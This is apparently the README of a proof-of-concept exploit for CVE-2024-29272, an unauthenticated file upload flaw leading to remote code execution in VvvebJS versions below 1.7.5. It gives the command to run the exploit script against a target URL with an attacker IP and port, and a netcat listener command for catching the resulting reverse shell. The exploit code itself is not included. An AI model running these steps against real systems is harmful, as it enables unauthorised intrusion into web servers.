# CVE-2024-29272
This is a Proof-of-Concept for CVE-2024-29272, an unauthenticated arbritrary file upload vulnerability that leads to remote code execution on versions of VvvebJS < 1.7.5

usage:
```
python3 poc.py -u <URL> -l <ATTACKER IP> -p <ATTACKER PORT>
```

in another terminal:
```
nc -lvnp <ATTACKER PORT>
```
